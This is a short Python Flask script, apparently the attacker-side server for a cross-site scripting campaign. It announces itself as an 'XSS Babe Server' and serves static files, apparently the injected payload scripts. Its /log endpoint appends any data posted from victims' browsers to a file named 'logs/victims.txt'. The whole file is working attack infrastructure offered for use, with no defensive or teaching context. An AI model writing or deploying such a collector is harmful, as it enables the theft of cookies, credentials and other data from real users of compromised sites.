#!/usr/bin/env python3

from flask import Flask, request, send_from_directory
import os
from datetime import datetime

app = Flask(__name__)
LOG_PATH = "logs/victims.txt"

@app.route('/')
def index():
    return "XSS Babe Server Active"

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

@app.route('/log', methods=['POST'])
def log_data():
    if not os.path.exists("logs"):
        os.makedirs("logs")
    data = request.get_data(as_text=True)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_PATH, "a") as f:
        f.write(f"[{timestamp}] {data}\n")
    return "Logged", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
